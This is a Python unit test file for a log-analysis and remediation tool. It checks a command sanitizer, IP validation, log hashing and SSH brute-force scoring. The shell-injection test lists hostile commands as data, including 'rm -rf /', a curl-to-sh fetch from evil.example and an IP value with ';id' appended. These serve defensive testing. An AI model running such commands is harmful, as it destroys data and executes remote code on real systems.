"""Security, idempotency, rule-baseline, and evidence-routing unit tests."""

from __future__ import annotations

import unittest

from app.engine.parser import (
    compute_content_hash,
    evaluate_batch_rules,
    is_valid_ip,
    parse_and_batch_logs,
    sanitize_remediation_commands,
)


class TestSecurityAndRules(unittest.TestCase):
    """Verify shell-injection guards, idempotency hashing, and rule-based scoring."""

    def test_sanitize_blocks_shell_injection(self) -> None:
        hostile_commands = [
            "sudo ufw insert 1 deny from 185.220.101.45; rm -rf /",
            "sudo ufw deny from 185.220.101.45 && curl http://evil.example/pwn.sh | sh",
            "sudo usermod -L $(whoami)",
            "sudo iptables -I INPUT -s 999.999.1.1 -j DROP",
            "rm -rf /var/log/auth.log",
        ]
        safe = sanitize_remediation_commands(hostile_commands, allowed_ips=["185.220.101.45"])
        self.assertEqual(safe, [])

    def test_sanitize_allows_valid_defensive_commands(self) -> None:
        valid_commands = [
            "sudo ufw insert 1 deny from 185.220.101.45 to any comment 'SOC-T1110'",
            "sudo fail2ban-client set sshd banip 185.220.101.45",
            "sudo usermod -L deploy",
            'echo "deny 185.220.101.45;" | sudo tee -a /etc/nginx/conf.d/soc_blocklist.conf && sudo nginx -t && sudo systemctl reload nginx',
        ]
        safe = sanitize_remediation_commands(valid_commands, allowed_ips=["185.220.101.45"])
        self.assertEqual(len(safe), 4)

    def test_ip_validation_strictness(self) -> None:
        self.assertTrue(is_valid_ip("185.220.101.45"))
        self.assertTrue(is_valid_ip("2001:db8::1"))
        self.assertFalse(is_valid_ip("185.220.101.45;id"))
        self.assertFalse(is_valid_ip("999.1.1.1"))

    def test_content_hash_is_idempotent(self) -> None:
        log_a = "Nov 24 14:00:01 h sshd[1]: Failed password for root from 1.2.3.4 port 22 ssh2\n"
        log_b = "  Nov 24 14:00:01 h sshd[1]: Failed password for root from 1.2.3.4 port 22 ssh2  \n\n"
        self.assertEqual(compute_content_hash(log_a), compute_content_hash(log_b))

    def test_rule_baseline_distinguishes_admin_typo_vs_compromise(self) -> None:
        typo_log = "Nov 24 18:06:01 srv sshd[720]: Failed password for alice from 10.0.5.22 port 51300 ssh2"
        res_typo = parse_and_batch_logs(typo_log, source_hint="auth.log", reference_year=2026)
        rule_typo = evaluate_batch_rules(res_typo.batches[0])
        self.assertEqual(rule_typo.verdict, "benign")
        self.assertTrue(rule_typo.is_ambiguous)

        comp_log = (
            "Nov 24 14:15:01 srv sshd[401]: Failed password for root from 185.220.101.45 port 51200 ssh2\n"
            "Nov 24 14:15:02 srv sshd[401]: Failed password for root from 185.220.101.45 port 51200 ssh2\n"
            "Nov 24 14:15:05 srv sshd[403]: Accepted password for root from 185.220.101.45 port 51202 ssh2"
        )
        res_comp = parse_and_batch_logs(comp_log, source_hint="auth.log", reference_year=2026)
        rule_comp = evaluate_batch_rules(res_comp.batches[0])
        self.assertEqual(rule_comp.verdict, "malicious")
        self.assertEqual(rule_comp.severity, "Critical")
        self.assertTrue(rule_comp.post_failure_success)


if __name__ == "__main__":
    unittest.main()
